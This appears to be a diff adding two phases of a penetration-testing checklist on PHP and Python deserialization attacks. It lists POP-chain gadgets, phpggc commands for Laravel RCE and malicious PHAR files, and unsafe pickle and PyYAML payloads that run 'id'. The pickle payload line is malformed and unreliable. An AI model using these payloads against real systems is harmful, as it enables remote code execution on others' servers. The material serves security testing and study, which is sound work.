@@ -1,0 +1,24 @@
+**Phase 4: PHP Deserialization**
+- **Native `unserialize()`**:
+  - POP chains: `__wakeup`, `__destruct`, `__toString`, `__call`
+  - Common gadgets: `GuzzleHttp`, `Monolog`, `SwiftMailer`, `Doctrine`, `Laravel`
+  - Tool: `phpggc` (PHP Generic Gadget Chains)
+  ```bash
+  phpggc Laravel/RCE1 'system("id");' | base64 -w0
+  ```
+- **Phar Deserialization**:
+  - `phar://` wrapper triggers deserialization
+  - Create malicious PHAR with `phpggc --phar phar.phar`
+  - Trigger via `file_exists("phar:///path/to/phar.phar")`
+- **Session Deserialization**:
+  - `session.save_handler` with custom serializer
+
+**Phase 5: Python Deserialization**
+- **Pickle**:
+  - `pickle.loads()` → arbitrary code via `__reduce__`
+  - Payload: `pickle.dumps({'__reduce__': lambda: (os.system, ('id',))})`
+  - Tool: `pickle_payload.py`
+- **YAML (PyYAML)**:
+  - `yaml.load()` without `SafeLoader` → `!!python/object/apply:os.system`
+  - Payload: `!!python/object/apply:subprocess.check_output [["id"]]`
+- **JSON (not directly exploitable but check for `object_hook`)**
